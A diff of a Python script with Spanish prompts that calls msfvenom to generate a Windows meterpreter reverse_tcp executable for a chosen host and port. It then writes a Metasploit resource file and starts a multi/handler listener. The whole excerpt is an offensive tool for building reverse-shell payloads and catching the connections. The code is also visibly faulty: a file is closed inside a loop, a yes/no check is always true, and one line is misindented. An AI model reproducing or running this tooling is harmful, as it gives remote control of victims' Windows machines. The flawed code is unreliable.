@@ -74,18 +74,30 @@ while True:
             print("\nCreando exploit...")
             if os.name == "nt":
                 os.system("cd C:\metasploit && msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
-                continue
+                salir = input("Desea abrir el listener de metasploit? (s/n): ")
+                f = open("meta.rc", "w+")
+                for i in range(1):
+                    f.write("use exploit/multi/handler\n")
+                    f.write("set payload windows/meterpreter/reverse_tcp\n")
+                    f.write("set lhost 0.0.0.0\n")
+                    f.write("set lport {}\n".format(lport))
+                    f.write("exploit")
+                    f.close()
+                if salir == "s" or "S":
+                    os.system("msfconsole -r meta.rc")
+                else:
+                    continue
             else:
                 os.system("msfvenom -p windows/meterpreter/reverse_tcp lhost={} lport={} -f exe -o {}.exe".format(lhost, lport, output))
                 salir = input("Desea abrir el listener de metasploit? (s/n): ")
-            f = open("meta.rc", "w+")
-            for i in range(1):
-                f.write("use exploit/multi/handler\n")
-                f.write("set payload windows/meterpreter/reverse_tcp\n")
-                f.write("set lhost 0.0.0.0\n")
-                f.write("set lport {}\n".format(lport))
-                f.write("exploit")
-            f.close()
+                f = open("meta.rc", "w+")
+                for i in range(1):
+                    f.write("use exploit/multi/handler\n")
+                    f.write("set payload windows/meterpreter/reverse_tcp\n")
+                    f.write("set lhost 0.0.0.0\n")
+                    f.write("set lport {}\n".format(lport))
+                    f.write("exploit")
+               f.close()
             if salir == "s" or "S":
                 os.system("msfconsole -r meta.rc")
             else:
